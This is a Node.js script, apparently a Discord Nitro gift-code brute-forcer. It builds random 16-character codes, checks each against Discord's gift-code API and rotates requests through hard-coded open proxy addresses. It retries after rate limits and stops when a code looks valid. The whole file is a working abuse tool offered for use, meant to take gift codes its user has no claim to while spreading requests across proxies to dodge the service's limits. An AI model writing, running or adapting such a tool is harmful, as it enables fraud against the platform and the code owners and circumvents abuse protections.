const request = require('request');
const timers = require('timers');
const colors = require('colors');
const util = require('util');
const setTimeoutPromise = util.promisify(setTimeout);

colors.setTheme({
  info: 'bgGreen',
  help: 'cyan',
  warn: 'yellow',
  success: 'bgBlue',
  error: 'red'
});

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

async function checkCode (id=makeid(16), proxy='') {
  var uri = 'https://discord.com/api/v6/entitlements/gift-codes/' + id
  var options;
  if (proxy === '') {
    options = { json: true }
  } else {
    options = { json:true, proxy: proxy }
  }
  request(uri, options,   async (err, res, body) => {
    if (err) { return console.log(err); }
    //console.log("======> [INFO] Made request using proxy: " + proxy)
    if (body.message.includes ("Unknown")) {
      console.warn ("======> [ERR] ".warn + id.warn + " not valid.".warn + ' Proxy: '.warn + proxy.warn)
      //timers.setTimeout(checkCode, 10000)
      await setTimeoutPromise(10000).then(() => {
        checkCode(makeid(16), proxy)
      })
    } else if (body.message.includes ('rate')) {
      console.warn("======> [WARN] You are being rate limited. Sleeping for ".error + body.retry_after.toString().error + " ms. Proxy: ".error + proxy.error);
      //timers.setTimeout(checkCode, body.retry_after, id)
      await setTimeoutPromise(body.retry_after).then(() => {
        checkCode(id, proxy)
      })
    }

    else {
      console.log("======> [RES] Possible resolution?".success)
      console.log ("======> [STACK TRACE] CODE: " + id.success)
      console.log (body);
      process.exit(22);
    }
  });
}

// start generator
checkCode(makeid(16), 'http://147.75.51.179:3128');
checkCode(makeid(16), 'http://92.244.99.229:3128');
checkCode(makeid(16), 'http://191.97.1.215:8080');
checkCode(makeid(16), 'http://201.91.82.155:3128');
checkCode(makeid(16), 'http://188.32.128.87:8081');
checkCode(makeid(16), 'http://130.61.95.193:3128');
checkCode(makeid(16), '');
